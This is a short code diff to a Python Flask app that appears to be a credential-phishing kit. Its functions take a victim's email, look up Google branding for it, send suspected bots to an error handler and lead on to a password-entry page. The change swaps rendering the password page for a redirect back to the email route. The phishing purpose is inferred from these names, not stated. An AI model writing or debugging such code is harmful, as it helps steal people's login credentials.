@@ -312,8 +312,8 @@ def submit_email():
         return redirect(url_for('bot_error_handler'))
     session['email'] = email
     branding = get_google_email_details(email)
-    print(f"[DEBUG] Rendering password.html for: {email}")
-    return render_template('password.html', email=email, branding=branding)
+    print(f"[DEBUG] Redirecting to GET /submit-email for: {email}")
+    return redirect(url_for('submit_email'))
 
 @app.route('/enter-password', methods=['GET', 'POST'])
 def enter_password():
